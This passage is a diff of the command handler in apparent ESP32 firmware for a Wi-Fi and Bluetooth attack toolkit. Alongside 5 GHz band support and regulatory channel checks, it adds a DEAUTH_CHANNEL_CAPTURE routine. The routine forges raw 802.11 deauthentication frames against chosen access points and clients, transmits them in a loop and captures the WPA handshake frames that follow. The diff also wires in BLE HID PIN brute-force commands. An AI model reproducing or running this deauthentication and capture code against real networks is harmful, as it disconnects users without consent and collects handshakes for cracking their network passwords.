@@ -26,6 +26,7 @@
 #include "ble_hid.h"
 #include "ble_scanner.h"
 #include "ble_profile.h"
+#include "ble_pin_bruteforce.h"
 #endif
 
 #if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
@@ -43,6 +44,8 @@
 // ── Chip name ────────────────────────────────────────────────────────────────
 #if defined(CONFIG_IDF_TARGET_ESP32C3)
     #define CHIP_NAME "ESP32-C3"
+#elif defined(CONFIG_IDF_TARGET_ESP32C5)
+    #define CHIP_NAME "ESP32-C5"
 #elif defined(CONFIG_IDF_TARGET_ESP32S3)
     #define CHIP_NAME "ESP32-S3"
 #elif defined(CONFIG_IDF_TARGET_ESP32S2)
@@ -87,14 +90,188 @@ static String getDeviceId() {
 }
 
 // ── IDF-level scan ───────────────────────────────────────────────────────────
-static volatile bool _scanDone = false;
 static uint16_t g_lastHtmlSeq = 0xFFFF;
 
-static void wifiEventHandler(arduino_event_id_t event) {
-    if (event == ARDUINO_EVENT_WIFI_SCAN_DONE) _scanDone = true;
+
+enum class WifiBandMode : uint8_t {
+    BAND_2G = 0,
+    BAND_5G,
+    AUTO,
+};
+
+static const uint8_t WIFI_5G_CHANNELS[] = {
+    36, 40, 44, 48, 52, 56, 60, 64,
+    100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144,
+    149, 153, 157, 161, 165, 169, 173, 177,
+};
+
+static bool isWifi5GhzEnabled() {
+#if defined(CONFIG_IDF_TARGET_ESP32C5)
+    return true;
+#else
+    return false;
+#endif
+}
+
+static bool isValidWifiChannel(uint8_t channel) {
+    if (channel >= 1 && channel <= 14) return true;
+    for (uint8_t ch : WIFI_5G_CHANNELS) {
+        if (ch == channel) return true;
+    }
+    return false;
+}
+
+static const char* wifiBandForChannel(uint8_t channel) {
+    return channel >= 36 ? "5g" : "2g";
+}
+
+static const char* wifiBandModeName(WifiBandMode mode) {
+    switch (mode) {
+        case WifiBandMode::BAND_2G: return "2g";
+        case WifiBandMode::BAND_5G: return "5g";
+        case WifiBandMode::AUTO: return "auto";
+    }
+    return "2g";
+}
+
+static int wifi5gChannelBit(uint8_t channel) {
+    switch (channel) {
+        case 36: return 1;
+        case 40: return 2;
+        case 44: return 3;
+        case 48: return 4;
+        case 52: return 5;
+        case 56: return 6;
+        case 60: return 7;
+        case 64: return 8;
+        case 100: return 9;
+        case 104: return 10;
+        case 108: return 11;
+        case 112: return 12;
+        case 116: return 13;
+        case 120: return 14;
+        case 124: return 15;
+        case 128: return 16;
+        case 132: return 17;
+        case 136: return 18;
+        case 140: return 19;
+        case 144: return 20;
+        case 149: return 21;
+        case 153: return 22;
+        case 157: return 23;
+        case 161: return 24;
+        case 165: return 25;
+        case 169: return 26;
+        case 173: return 27;
+        case 177: return 28;
+        default: return -1;
+    }
+}
+
+static bool isChannelAllowedByCountry(uint8_t channel) {
+    wifi_country_t country = {};
+    if (esp_wifi_get_country(&country) != ESP_OK) return true;
+
+    if (channel >= 1 && channel <= 14) {
+        if (country.nchan == 0) return true;
+        return channel >= country.schan &&
+               channel < (uint16_t)country.schan + (uint16_t)country.nchan;
+    }
+
+#if CONFIG_SOC_WIFI_SUPPORT_5G
+    if (!isWifi5GhzEnabled()) return false;
+    const int bit = wifi5gChannelBit(channel);
+    if (bit < 0) return false;
+    // A zero mask means the local regulatory rules allow the 5 GHz channels.
+    if (country.wifi_5g_channel_mask == 0) return true;
+    return (country.wifi_5g_channel_mask & (1u << bit)) != 0;
+#else
+    return false;
+#endif
+}
+
+static String regulatoryChannelError(uint8_t channel) {
+    char cc[4] = {0};
+    esp_wifi_get_country_code(cc);
+    String error = "channel ";
+    error += channel;
+    error += " is not allowed by regulatory country ";
+    error += (cc[0] ? cc : "01");
+    return error;
+}
+
+static bool validateRegulatoryChannel(uint8_t channel, String& error) {
+    if (isChannelAllowedByCountry(channel)) return true;
+    error = regulatoryChannelError(channel);
+    return false;
+}
+
+static void appendAllowedWifiChannels(JsonDocument& doc) {
+    JsonArray channels2g = doc["allowed_2ghz_channels"].to<JsonArray>();
+    const uint8_t max2g = 14;
+    for (uint8_t channel = 1; channel <= max2g; channel++) {
+        if (isChannelAllowedByCountry(channel)) channels2g.add(channel);
+    }
+
+    JsonArray channels5g = doc["allowed_5ghz_channels"].to<JsonArray>();
+    if (isWifi5GhzEnabled()) {
+        for (uint8_t channel : WIFI_5G_CHANNELS) {
+            if (isChannelAllowedByCountry(channel)) channels5g.add(channel);
+        }
+    }
+}
+
+static void applyStoredWifiCountry() {
+    Preferences prefs;
+    String country = "01";
+    if (prefs.begin("nrsuite", true)) {
+        country = prefs.getString("wifi_country", "01");
+        prefs.end();
+    }
+    country.trim();
+    country.toUpperCase();
+    if (country.length() != 2) country = "01";
+    const esp_err_t err = esp_wifi_set_country_code(country.c_str(), false);
+    if (err != ESP_OK) {
+        Serial.printf("WiFi country %s rejected: %s (%d)\n",
+                      country.c_str(), esp_err_to_name(err), (int)err);
+        esp_wifi_set_country_code("01", false);
+    }
+}
+
+static bool configureWifiBand(const char* band, WifiBandMode& mode, String& error) {
+    const bool fiveSupported = isWifi5GhzEnabled();
+
+    if (strcmp(band, "auto") == 0) {
+        mode = fiveSupported ? WifiBandMode::AUTO : WifiBandMode::BAND_2G;
+    } else if (strcmp(band, "2g") == 0 || strcmp(band, "2.4g") == 0) {
+        mode = WifiBandMode::BAND_2G;
+    } else if (strcmp(band, "5g") == 0) {
+        if (!fiveSupported) {
+            error = "5 GHz is not enabled in this firmware build";
+            return false;
+        }
+        mode = WifiBandMode::BAND_5G;
+    } else {
+        error = "unsupported band";
+        return false;
+    }
+
+    #if defined(CONFIG_IDF_TARGET_ESP32C5)
+        if (mode == WifiBandMode::AUTO) {
+            esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
+        } else if (mode == WifiBandMode::BAND_5G) {
+            esp_wifi_set_band_mode(WIFI_BAND_MODE_5G_ONLY);
+        } else {
+            esp_wifi_set_band_mode(WIFI_BAND_MODE_2G_ONLY);
+        }
+    #endif
+    return true;
 }
 
 static int idf_scan_networks(BridgeProtocol& proto) {
+    (void)proto;
+
     wifi_scan_config_t cfg = {};
     cfg.ssid        = nullptr;
     cfg.bssid       = nullptr;
@@ -104,25 +281,24 @@ static int idf_scan_networks(BridgeProtocol& proto) {
     cfg.scan_time.active.min = 100;
     cfg.scan_time.active.max = 300;
 
-    _scanDone = false;
-    WiFi.onEvent(wifiEventHandler);
-
-    esp_err_t err = esp_wifi_scan_start(&cfg, false);
-    if (err != ESP_OK) return -1;
-
-    uint32_t deadline = millis() + 8000;
-    while (!_scanDone && millis() < deadline) {
-        proto.update();
-        vTaskDelay(pdMS_TO_TICKS(20));
-    }
-
-    if (!_scanDone) {
+    // Use ESP-IDF's blocking scan. The Arduino SCAN_DONE event path has
+    // proven unreliable on C5, leaving the command waiting until timeout.
+    esp_err_t err = esp_wifi_scan_start(&cfg, true);
+    if (err != ESP_OK) {
+        Serial.printf("SCAN_WIFI: esp_wifi_scan_start failed: %s (%d)\n",
+                      esp_err_to_name(err), (int)err);
         esp_wifi_scan_stop();
         return -1;
     }
 
     uint16_t count = 0;
-    esp_wifi_scan_get_ap_num(&count);
+    err = esp_wifi_scan_get_ap_num(&count);
+    if (err != ESP_OK) {
+        Serial.printf("SCAN_WIFI: esp_wifi_scan_get_ap_num failed: %s (%d)\n",
+                      esp_err_to_name(err), (int)err);
+        esp_wifi_scan_stop();
+        return -1;
+    }
     return (int)count;
 }
 
@@ -167,6 +343,7 @@ static void stopAllModules() {
         bleProfile.stop();
         bleScanner.stop();
         BleHid::end();
+        blePinBruteforce.onBleEnded();
     #endif
     #if MSC_SUPPORTED
         FileUpload::reset();
@@ -319,6 +496,39 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
         proto.sendResp(id, true, "pong");
     }
 
+    // ── REGULATORY COUNTRY ────────────────────────────────────────────────
+    else if (strcmp(cmd, "SET_COUNTRY") == 0) {
+        String requested = doc["args"]["country"] | "";
+        requested.trim();
+        requested.toUpperCase();
+        if (requested.length() != 2) {
+            proto.sendResp(id, false, "country code must be two characters");
+            return;
+        }
+
+        const esp_err_t err = esp_wifi_set_country_code(requested.c_str(), false);
+        if (err != ESP_OK) {
+            String msg = "country rejected: ";
+            msg += esp_err_to_name(err);
+            proto.sendResp(id, false, msg.c_str());
+            return;
+        }
+
+        Preferences prefs;
+        if (prefs.begin("nrsuite", false)) {
+            prefs.putString("wifi_country", requested);
+            prefs.end();
+        }
+
+        JsonDocument resp;
+        resp["ok"] = true;
+        resp["country"] = requested;
+        appendAllowedWifiChannels(resp);
+        String json;
+        serializeJson(resp, json);
+        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
+    }
+
     // ── STATUS ────────────────────────────────────────────────────────────
     else if (strcmp(cmd, "STATUS") == 0 || strcmp(cmd, "HEAP") == 0) {
         JsonDocument resp;
@@ -330,9 +540,21 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
         resp["proto_minor"] = 1;
         resp["fw"]          = FW_VERSION;
         resp["device_id"] = getDeviceId();
+        char countryCode[4] = {0};
+        if (esp_wifi_get_country_code(countryCode) != ESP_OK) {
+            strcpy(countryCode, "01");
+        }
+        resp["country"] = countryCode;
+        appendAllowedWifiChannels(resp);
         JsonArray features = resp["features"].to<JsonArray>();
         features.add("wifi");
+        features.add("wifi_2ghz");
+        #if defined(CONFIG_IDF_TARGET_ESP32C5)
+            features.add("wifi_5ghz");
+        #endif
         features.add("sniff");
+        features.add("auto_handshake");
+        features.add("nrugochi");
         features.add("client_detect");
         features.add("deauth");
         features.add("deauth_detect");
@@ -355,6 +577,7 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
             features.add("ble_hid");
             features.add("ble_scan");
             features.add("ble_profile");
+            features.add("ble_pin_bruteforce");
         #endif
         #if MSC_SUPPORTED
             features.add("msc");
@@ -434,21 +657,40 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
     else if (strcmp(cmd, "START_SNIFF") == 0) {
         radioIdle();  // stop beacon / portal / prior sniff before starting
 
+        const char* band = doc["args"]["band"] | "auto";
+        WifiBandMode bandMode = WifiBandMode::BAND_2G;
+        String bandError;
+        if (!configureWifiBand(band, bandMode, bandError)) {
+            proto.sendResp(id, false, bandError.c_str());
+            return;
+        }
+
         const char* mode      = doc["args"]["mode"] | "fixed";
         bool        eapolOnly = doc["args"]["eapol_only"] | false;
+        bool        allBeacons = doc["args"]["all_beacons"] | false;
         const char* bssidStr  = doc["args"]["bssid"] | "";
+        const bool allow5ghz = bandMode != WifiBandMode::BAND_2G;
 
         uint8_t bssid[6];
         bool hasBssid = parseMac(bssidStr, bssid);
-        sniffer.setEapolFilter(eapolOnly, hasBssid ? bssid : nullptr);
+        sniffer.setEapolFilter(eapolOnly, hasBssid ? bssid : nullptr, allBeacons);
 
         bool ok;
         if (strcmp(mode, "hop") == 0) {
             uint16_t interval = doc["args"]["interval_ms"] | 300;
-            ok = sniffer.startHop(interval);
+            ok = sniffer.startHop(interval, allow5ghz);
         } else {
             uint8_t channel = doc["args"]["channel"] | 1;
-            ok = sniffer.startFixed(channel);
+            if (!isValidWifiChannel(channel)) {
+                proto.sendResp(id, false, "invalid channel");
+                return;
+            }
+            String regulatoryError;
+            if (!validateRegulatoryChannel(channel, regulatoryError)) {
+                proto.sendResp(id, false, regulatoryError.c_str());
+                return;
+            }
+            ok = sniffer.startFixed(channel, allow5ghz);
         }
 
         proto.sendResp(id, ok, ok ? "sniffing started" : "invalid channel");
@@ -457,7 +699,11 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
     // ── STOP_SNIFF ────────────────────────────────────────────────────────
     else if (strcmp(cmd, "STOP_SNIFF") == 0) {
         SniffStats s = sniffer.stats();
-        sniffer.stop();
+        if (sniffer.active()) {
+            sniffer.stop();
+        } else {
+            esp_wifi_set_promiscuous(false);
+        }
         JsonDocument resp;
         resp["ok"]       = true;
         resp["captured"] = s.captured;
@@ -471,21 +717,43 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
     else if (strcmp(cmd, "START_CLIENT_DETECT") == 0) {
         radioIdle();
 
+        const char* band = doc["args"]["band"] | "auto";
+        WifiBandMode bandMode = WifiBandMode::BAND_2G;
+        String bandError;
+        if (!configureWifiBand(band, bandMode, bandError)) {
+            proto.sendResp(id, false, bandError.c_str());
+            return;
+        }
+        const bool allow5ghz = bandMode != WifiBandMode::BAND_2G;
+
         const char* mode = doc["args"]["mode"] | "fixed";
         bool ok;
         if (strcmp(mode, "hop") == 0) {
             uint16_t interval = doc["args"]["interval_ms"] | 300;
-            ok = sniffer.startClientHop(interval);
+            ok = sniffer.startClientHop(interval, allow5ghz);
         } else {
             uint8_t channel = doc["args"]["channel"] | 1;
-            ok = sniffer.startClientFixed(channel);
+            if (!isValidWifiChannel(channel)) {
+                proto.sendResp(id, false, "invalid channel");
+                return;
+            }
+            String regulatoryError;
+            if (!validateRegulatoryChannel(channel, regulatoryError)) {
+                proto.sendResp(id, false, regulatoryError.c_str());
+                return;
+            }
+            ok = sniffer.startClientFixed(channel, allow5ghz);
         }
 
         proto.sendResp(id, ok, ok ? "client detection started" : "invalid channel");
     }
 
     else if (strcmp(cmd, "STOP_CLIENT_DETECT") == 0) {
-        sniffer.stop();
+        if (sniffer.active()) {
+            sniffer.stop();
+        } else {
+            esp_wifi_set_promiscuous(false);
+        }
         SniffStats s = sniffer.stats();
         JsonDocument resp;
         resp["ok"]       = true;
@@ -500,11 +768,27 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
     else if (strcmp(cmd, "START_HIDDEN_AP") == 0) {
         radioIdle();
 
+        const char* band = doc["args"]["band"] | "auto";
+        WifiBandMode bandMode = WifiBandMode::BAND_2G;
+        String bandError;
+        if (!configureWifiBand(band, bandMode, bandError)) {
+            proto.sendResp(id, false, bandError.c_str());
+            return;
+        }
+
         HiddenApConfig config;
         const char* mode = doc["args"]["mode"] | "fixed";
         config.hop = strcmp(mode, "hop") == 0;
+        config.include5ghz = bandMode != WifiBandMode::BAND_2G;
         config.channel = doc["args"]["channel"] | 1;
         config.intervalMs = doc["args"]["interval_ms"] | 300;
+        if (!config.hop) {
+            String regulatoryError;
+            if (!validateRegulatoryChannel(config.channel, regulatoryError)) {
+                proto.sendResp(id, false, regulatoryError.c_str());
+                return;
+            }
+        }
 
         bool ok = hiddenApDetector.start(config);
         proto.sendResp(id, ok, ok ? "hidden AP detection started" : "invalid channel");
@@ -550,12 +834,29 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
     // ── SET_CHANNEL ──────────────────────────────────────────────────────
     else if (strcmp(cmd, "SET_CHANNEL") == 0) {
         uint8_t channel = doc["args"]["channel"] | 1;
+        if (!isValidWifiChannel(channel)) {
+            proto.sendResp(id, false, "invalid channel");
+            return;
+        }
+        String regulatoryError;
+        if (!validateRegulatoryChannel(channel, regulatoryError)) {
+            proto.sendResp(id, false, regulatoryError.c_str());
+            return;
+        }
         bool ok = sniffer.setChannel(channel);
-            proto.sendResp(id, ok, ok ? "channel set" : "invalid channel (must be 1-13)");
+        proto.sendResp(id, ok, ok ? "channel set" : "channel change failed");
     }
 
     // ── SCAN_WIFI ─────────────────────────────────────────────────────────
     else if (strcmp(cmd, "SCAN_WIFI") == 0) {
+        const char* band = doc["args"]["band"] | "auto";
+        WifiBandMode bandMode = WifiBandMode::BAND_2G;
+        String bandError;
+        if (!configureWifiBand(band, bandMode, bandError)) {
+            proto.sendResp(id, false, bandError.c_str());
+            return;
+        }
+
         bool wasSniffing = sniffer.active();
         uint8_t prevChannel = sniffer.channel();
         bool wasHopping = sniffer.hopping();
@@ -589,6 +890,7 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
                     ev["rssi"]     = records[i].rssi;
                     ev["security"] = authModeStr(records[i].authmode);
                     ev["wps"]      = (bool)records[i].wps;
+                    ev["band"]     = wifiBandForChannel(records[i].primary);
                     proto.sendEvent("scan_ap", ev);
                 }
             }
@@ -600,13 +902,14 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
         JsonDocument resp;
         resp["ok"] = true;
         resp["count"] = n;
+        resp["band"] = wifiBandModeName(bandMode);
         String json; serializeJson(resp, json);
         proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
 
 
         if (wasSniffing) {
             if (wasHopping) sniffer.startHop(300);
-            else sniffer.startFixed(prevChannel);
+            else sniffer.startFixed(prevChannel, isWifi5GhzEnabled());
         }
     }
 
@@ -615,8 +918,25 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
     else if (strcmp(cmd, "DEAUTH") == 0 || strcmp(cmd, "DEAUTH_CAPTURE") == 0) {
         JsonVariant args = doc["args"];
 
+        const char* band = args["band"] | "auto";
+        WifiBandMode bandMode = WifiBandMode::BAND_2G;
+        String bandError;
+        if (!configureWifiBand(band, bandMode, bandError)) {
+            proto.sendResp(id, false, bandError.c_str());
+            return;
+        }
+
         // Robust parsing with sane defaults
         uint8_t  channel    = args["channel"].as<uint8_t>() ? args["channel"].as<uint8_t>() : 1;
+        if (!isValidWifiChannel(channel)) {
+            proto.sendResp(id, false, "invalid channel");
+            return;
+        }
+        String regulatoryError;
+        if (!validateRegulatoryChannel(channel, regulatoryError)) {
+            proto.sendResp(id, false, regulatoryError.c_str());
+            return;
+        }
         uint32_t count      = args["count"].as<uint32_t>()   ? args["count"].as<uint32_t>()   : 150;
         uint8_t  reason     = args["reason"].as<uint8_t>()  ? args["reason"].as<uint8_t>()  : 7;
 
@@ -680,7 +1000,7 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
         // Optionally start EAPOL capture after deauth
         if (strcmp(cmd, "DEAUTH_CAPTURE") == 0) {
             sniffer.setEapolFilter(true, bssid);
-            sniffer.startFixed(channel);
+            sniffer.startFixed(channel, bandMode != WifiBandMode::BAND_2G);
         }
 
         // Send stats
@@ -698,15 +1018,166 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
         proto.sendResp(id, true, "deauth completed");
     }
 
+    // ── DEAUTH_CHANNEL_CAPTURE ───────────────────────────────────────────
+    // Pwnagotchi/Nrugochi-style multi-AP deauth on one channel followed by
+    // all-EAPOL + all-beacon capture. This keeps the Android PCAP collector
+    // open and lets Android split frames into per-BSSID HS_<BSSID>.pcap files.
+    else if (strcmp(cmd, "DEAUTH_CHANNEL_CAPTURE") == 0) {
+        JsonVariant args = doc["args"];
+        const char* band = args["band"] | "auto";
+        WifiBandMode bandMode = WifiBandMode::BAND_2G;
+        String bandError;
+        if (!configureWifiBand(band, bandMode, bandError)) {
+            proto.sendResp(id, false, bandError.c_str());
+            return;
+        }
+        const bool allow5ghz = bandMode != WifiBandMode::BAND_2G;
+        uint8_t  channel    = args["channel"].as<uint8_t>() ? args["channel"].as<uint8_t>() : 1;
+        if (!isValidWifiChannel(channel)) {
+            proto.sendResp(id, false, "invalid channel");
+            return;
+        }
+        String regulatoryError;
+        if (!validateRegulatoryChannel(channel, regulatoryError)) {
+            proto.sendResp(id, false, regulatoryError.c_str());
+            return;
+        }
+        uint16_t count      = args["count"].as<uint16_t>() ? args["count"].as<uint16_t>() : 1;
+        uint16_t intervalMs = 20;
+        if (args.containsKey("deauth_interval_ms")) {
+            intervalMs = args["deauth_interval_ms"].as<uint16_t>();
+        } else if (args.containsKey("interval")) {
+            intervalMs = args["interval"].as<uint16_t>();
+        }
+        uint8_t reason = args["reason"].as<uint8_t>() ? args["reason"].as<uint8_t>() : 7;
+        bool allBeacons = args["all_beacons"] | true;
+
+        JsonArray targets = args["targets"].as<JsonArray>();
+
+        radioIdle();
+        esp_err_t setupErr = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+        if (setupErr != ESP_OK) {
+            String msg = "channel set failed: ";
+            msg += esp_err_to_name(setupErr);
+            proto.sendResp(id, false, msg.c_str());
+            return;
+        }
+
+        wifi_config_t ap_cfg = {};
+        setupErr = esp_wifi_get_config(WIFI_IF_AP, &ap_cfg);
+        if (setupErr == ESP_OK) {
+            ap_cfg.ap.channel = channel;
+            setupErr = esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
+        }
+        if (setupErr != ESP_OK) {
+            String msg = "AP channel sync failed: ";
+            msg += esp_err_to_name(setupErr);
+            proto.sendResp(id, false, msg.c_str());
+            return;
+        }
+
+        setupErr = esp_wifi_start();
+        if (setupErr != ESP_OK && setupErr != ESP_ERR_WIFI_STATE) {
+            String msg = "WiFi start failed: ";
+            msg += esp_err_to_name(setupErr);
+            proto.sendResp(id, false, msg.c_str());
+            return;
+        }
+        delay(180);
+
+        // Start capture before transmitting so the reassociation M1/M2 exchange
+        // is not missed. Beacon capture is de-duplicated per BSSID in Sniffer.
+        sniffer.setEapolFilter(true, nullptr, allBeacons);
+        if (!sniffer.startFixed(channel, allow5ghz)) {
+            proto.sendResp(id, false, "capture start failed for channel");
+            return;
+        }
+        delay(60);
+
+        uint32_t totalSent = 0;
+        uint32_t totalFailed = 0;
+        uint16_t targetsHit = 0;
+        uint32_t requestedFrames = 0;
+
+        for (JsonVariant t : targets) {
+            const char* bssidStr  = t["bssid"] | "";
+            const char* clientStr = t["client"] | "FF:FF:FF:FF:FF:FF";
+
+            uint8_t bssid[6] = {0};
+            uint8_t client[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+            if (!parseMac(bssidStr, bssid)) continue;
+            parseMac(clientStr, client);
+
+            uint8_t deauth_frame[26] = {
+                0xC0, 0x00, 0x00, 0x00,
+                0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,   // Addr1 (client)
+                0x00,0x00,0x00,0x00,0x00,0x00,   // Addr2 (BSSID)
+                0x00,0x00,0x00,0x00,0x00,0x00,   // Addr3 (BSSID)
+                0x00, 0x00, 0x00, 0x07            // Seq + reason
+            };
+            memcpy(deauth_frame + 4, client, 6);
+            memcpy(deauth_frame + 10, bssid, 6);
+            memcpy(deauth_frame + 16, bssid, 6);
+
+            uint16_t seq = 0x0010;
+            requestedFrames += count;
+            for (uint16_t i = 0; i < count; i++) {
+                deauth_frame[22] = seq & 0xFF;
+                deauth_frame[23] = (seq >> 8) & 0xFF;
+                deauth_frame[25] = reason;
+                if (esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, 26, true) == ESP_OK) {
+                    totalSent++;
+                } else {
+                    totalFailed++;
+                }
+                seq += 0x0010;
+                delay(intervalMs);
+            }
+            targetsHit++;
+        }
+
+        JsonDocument resp;
+        resp["ok"]              = targetsHit > 0;
+        resp["msg"]             = targetsHit > 0
+            ? "channel deauth capture started"
+            : "no valid deauth targets";
+        resp["band"]            = wifiBandModeName(bandMode);
+        resp["channel"]         = channel;
+        resp["targets"]         = targetsHit;
+        resp["requested_frames"] = requestedFrames;
+        resp["sent_frames"]     = totalSent;
+        resp["failed_frames"]   = totalFailed;
+        resp["interval_ms"]     = intervalMs;
+        resp["reason"]          = reason;
+        String json; serializeJson(resp, json);
+        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
+    }
+
     // ── DEAUTH DETECTOR ───────────────────────────────────────────────────
     else if (strcmp(cmd, "DEAUTH_DETECT_START") == 0) {
         radioIdle();
 
+        const char* band = doc["args"]["band"] | "auto";
+        WifiBandMode bandMode = WifiBandMode::BAND_2G;
+        String bandError;
+        if (!configureWifiBand(band, bandMode, bandError)) {
+            proto.sendResp(id, false, bandError.c_str());
+            return;
+        }
+
         DeauthDetectConfig cfg;
         const char* mode = doc["args"]["mode"] | "fixed";
         cfg.hop = (strcmp(mode, "hop") == 0) || (doc["args"]["hop"] | false);
+        cfg.include5ghz = bandMode != WifiBandMode::BAND_2G;
         cfg.channel = doc["args"]["channel"] | 1;
         cfg.intervalMs = doc["args"]["interval_ms"] | 300;
+        if (!cfg.hop) {
+            String regulatoryError;
+            if (!validateRegulatoryChannel(cfg.channel, regulatoryError)) {
+                proto.sendResp(id, false, regulatoryError.c_str());
+                return;
+            }
+        }
 
         const char* bssidStr = doc["args"]["bssid"] | "";
         uint8_t bssid[6];
@@ -768,18 +1239,59 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
     else if (strcmp(cmd, "START_PORTAL") == 0) {
         radioIdle();  // stop sniff / beacon / prior portal before starting
 
+        const char* band = doc["args"]["band"] | "auto";
+        WifiBandMode bandMode = WifiBandMode::BAND_2G;
+        String bandError;
+        if (!configureWifiBand(band, bandMode, bandError)) {
+            proto.sendResp(id, false, bandError.c_str());
+            return;
+        }
+
         const char* ssid = doc["args"]["ssid"] | "Home Network";
         uint8_t channel = doc["args"]["channel"] | 6;
+        if (!isValidWifiChannel(channel)) {
+            JsonDocument resp;
+            resp["ok"] = false;
+            resp["error"] = "invalid_channel";
+            resp["msg"] = "invalid channel";
+            resp["channel"] = channel;
+            String json; serializeJson(resp, json);
+            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
+            return;
+        }
+        String regulatoryError;
+        if (!validateRegulatoryChannel(channel, regulatoryError)) {
+            char cc[4] = {0};
+            esp_wifi_get_country_code(cc);
+            JsonDocument resp;
+            resp["ok"] = false;
+            resp["error"] = "regulatory_channel_blocked";
+            resp["msg"] = regulatoryError;
+            resp["channel"] = channel;
+            resp["country"] = cc[0] ? cc : "01";
+            appendAllowedWifiChannels(resp);
+            String json; serializeJson(resp, json);
+            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
+            return;
+        }
         const char* bssidStr = doc["args"]["bssid"] | "";
 
         uint8_t targetBssid[6] = {0};
         bool hasTarget = parseMac(bssidStr, targetBssid);
 
-        bool started = portal.start(ssid, channel, hasTarget ? targetBssid : nullptr);
+        String portalError;
+        bool started = portal.start(ssid, channel, hasTarget ? targetBssid : nullptr, &portalError);
         if (started) {
             proto.sendResp(id, true, "portal started");
         } else {
-            proto.sendResp(id, false, "softAP failed");
+            JsonDocument resp;
+            resp["ok"] = false;
+            resp["error"] = "softap_start_failed";
+            resp["msg"] = portalError.length() ? portalError : "softAP failed";
+            resp["channel"] = channel;
+            appendAllowedWifiChannels(resp);
+            String json; serializeJson(resp, json);
+            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
         }
     }
 
@@ -928,7 +1440,9 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
 
     else if (strcmp(cmd, "BLE_START") == 0) {
         mesh.stop();
-        if (bleScanner.active()) {
+        if (blePinBruteforce.active()) {
+            proto.sendResp(id, false, "stop BLE PIN bruteforce before starting BLE HID");
+        } else if (bleScanner.active()) {
             proto.sendResp(id, false, "stop BLE scan before starting BLE HID");
         } else if (bleProfile.active()) {
             proto.sendResp(id, false, "stop BLE profile before starting BLE HID");
@@ -952,6 +1466,7 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
 
     else if (strcmp(cmd, "BLE_STOP") == 0) {
         BleHid::end();
+        blePinBruteforce.onBleEnded();
         proto.sendResp(id, true, "ble stopped");
     }
 
@@ -1064,6 +1579,126 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
     else if (strcmp(cmd, "BLE_RELEASE_ALL") == 0) {
         BleHid::releaseAll();
         proto.sendResp(id, true);
+    }
+
+    // ── BLE HID PIN BRUTEFORCE ────────────────────────────────────────────
+    else if (strcmp(cmd, "BLE_PIN_ADVERTISE_START") == 0) {
+        if (bleScanner.active()) {
+            proto.sendResp(id, false, "stop BLE scan before starting BLE PIN");
+        } else if (bleProfile.active()) {
+            proto.sendResp(id, false, "stop BLE profile before starting BLE PIN");
+        } else {
+            radioIdle();
+            String error;
+            bool ok = blePinBruteforce.advertiseStart(doc["args"], error);
+            proto.sendResp(id, ok, ok ? "ble pin advertising started" : error.c_str());
+        }
+    }
+
+    else if (strcmp(cmd, "BLE_PIN_ADVERTISE_STOP") == 0) {
+        String error;
+        bool ok = blePinBruteforce.advertiseStop(error);
+        proto.sendResp(id, ok, ok ? "ble pin advertising stopped" : error.c_str());
+    }
+
+    else if (strcmp(cmd, "BLE_PIN_START") == 0) {
+        String error;
+        bool ok = blePinBruteforce.start(doc["args"], error);
+        proto.sendResp(id, ok, ok ? "ble pin started" : error.c_str());
+    }
+
+    else if (strcmp(cmd, "BLE_PIN_PAUSE") == 0) {
+        String error;
+        bool ok = blePinBruteforce.pause(error);
+        proto.sendResp(id, ok, ok ? "ble pin paused" : error.c_str());
+    }
+
+    else if (strcmp(cmd, "BLE_PIN_RESUME") == 0) {
+        String error;
+        bool ok = blePinBruteforce.resume(error);
+        proto.sendResp(id, ok, ok ? "ble pin resumed" : error.c_str());
+    }
+
+    else if (strcmp(cmd, "BLE_PIN_STOP") == 0) {
+        String error;
+        bool ok = blePinBruteforce.stop(error);
+        proto.sendResp(id, ok, ok ? "ble pin stopped" : error.c_str());
+    }
+
+    else if (strcmp(cmd, "BLE_PIN_NEXT") == 0) {
+        String error;
+        bool ok = blePinBruteforce.nextAttempt(error);
+        proto.sendResp(id, ok, ok ? "ble pin skipped" : error.c_str());
+    }
+
+    else if (strcmp(cmd, "BLE_PIN_PREV") == 0) {
+        String error;
+        bool ok = blePinBruteforce.previousAttempt(error);
+        proto.sendResp(id, ok, ok ? "ble pin moved back" : error.c_str());
+    }
+
+    else if (strcmp(cmd, "BLE_PIN_CLEAR") == 0) {
+        bool clearWordlist = doc["args"]["wordlist"] | false;
+        String error;
+        bool ok = blePinBruteforce.clear(clearWordlist, error);
+        proto.sendResp(id, ok, ok ? "ble pin cleared" : error.c_str());
+    }
+
+    else if (strcmp(cmd, "BLE_PIN_STATUS") == 0) {
+        JsonDocument resp;
+        resp["ok"] = true;
+        blePinBruteforce.status(resp);
+        String json;
+        serializeJson(resp, json);
